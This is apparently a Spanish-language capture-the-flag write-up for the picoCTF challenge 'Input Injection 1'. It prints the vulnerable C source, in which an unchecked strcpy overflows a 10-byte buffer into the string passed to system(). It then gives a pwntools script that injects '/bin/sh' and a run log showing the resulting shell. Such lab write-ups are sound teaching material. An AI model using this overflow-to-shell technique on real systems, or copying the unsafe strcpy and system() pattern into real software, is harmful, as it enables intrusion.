---
title: "Input Injection 1"
date: "2025-12-09"
tags: ["picoCTF", "buffer overflow"]
---

En este ejercicio nos dan un binario y su código. Examinando rápidamente si código podemos ver que es un ejercicio sencillo:

```c
void fun(char *name, char *cmd);

int main() {
    char name[200];
    printf("What is your name?\n");
    fflush(stdout);


    fgets(name, sizeof(name), stdin);
    name[strcspn(name, "\n")] = 0;

    fun(name, "uname");
    return 0;
}

void fun(char *name, char *cmd) {
    char c[10];
    char buffer[10];

    strcpy(c, cmd);
    strcpy(buffer, name);

    printf("Goodbye, %s!\n", buffer);
    fflush(stdout);
    system(c);
}
```

Lo que mas llama la atención es el `system(c)`. Ya que si logramos poner `/bin/sh` dentro nos daría una shell. Como podemos ver, no podemos modificar directamente el string de la variable c, ya que viene por defecto con el contenido "uname". Pero si que podemos editarla aplicando un "buffer overflow" entre comillas que sucede en esta linea:

```c
strcpy(buffer, name);
```

Esta linea copia el contenido de `name` (que controlamos) a `buffer`. Que tiene de malo? Pues que no tienen el mismo size. Buffer solo tiene un size de 10 bytes mientras que name tiene 200. Entonces, lo que introduzcamos por consola, se pondrán los primeros 10 caracteres en `buffer`, mientras que lo demás, por overflow, irán en `c`. Gracias a esto podemos explotar el programa de la siguiente manera, consiguiendo hacer un `system(/bin/sh)`

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./vuln_patched")

def main():
    io = conn()
    
    padding = b'A' * 10
    bin_sh = b'/bin/sh'

    io.recvline(b'What is your name?\n')
    io.sendline(padding + bin_sh)
    
    io.interactive()

if __name__ == "__main__":
    main()
```

```c
python3 solve.py                                             

    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to **** on port ****: Done
[!] 'keepends' argument is deprecated. Use 'drop' instead.
[*] Switching to interactive mode
Goodbye, AAAAAAAAAA/bin/sh!
$ whoami
ctf-player
$ ls
flag.txt
```

Gracias por leer!